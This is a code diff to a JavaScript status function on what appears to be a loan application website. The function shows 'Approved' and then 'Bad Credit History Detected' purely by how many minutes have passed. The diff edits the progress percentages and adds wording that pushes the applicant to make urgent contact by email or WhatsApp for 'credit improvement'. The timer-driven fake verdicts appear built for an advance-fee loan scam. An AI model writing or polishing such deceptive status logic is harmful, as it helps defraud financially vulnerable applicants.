@@ -1298,8 +1298,8 @@ function updateApplicationStatus(data) {
             updateApplicationStatus(data);
         }, 30000);
     } else if (timeDiff < twentyEightMinutes) {
-        // Second stage: 15-28 minutes: 98% "Your Loan Application has been Approved"
-        progress = 98;
+        // Second stage: 15-28 minutes: 98% "Your Loan Application Qualify for an Approval"
+        progress = 69;
         statusIndicator.className = 'status-indicator status-approved';
         statusText.textContent = 'Your Loan Application has been Approved';
         
@@ -1312,7 +1312,7 @@ function updateApplicationStatus(data) {
         }
     } else {
         // Final stage: After 28-32 minutes: "Bad Credit History Detected"
-        progress = 100;
+        progress = 97;
         statusIndicator.className = 'status-indicator status-rejected';
         statusText.textContent = 'Bad Credit History Detected';
         
@@ -1322,7 +1322,7 @@ function updateApplicationStatus(data) {
             nextStepsCard.innerHTML = `
                 <div class="card-title with-line">Credit Improvement Required</div>
                 <p>We've detected issues with your credit history that need to be addressed before we can proceed with your loan payout.</p>
-                <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately to complete your credit improvement process:</p>
+                <p style="margin-top: 15px; font-weight: bold; color: var(--primary);">Please contact us immediately via email or whatsapp to complete your credit improvement process:</p>
                 <div class="contact-item">
                     <div class="contact-icon">
                         <i class="fab fa-whatsapp"></i>
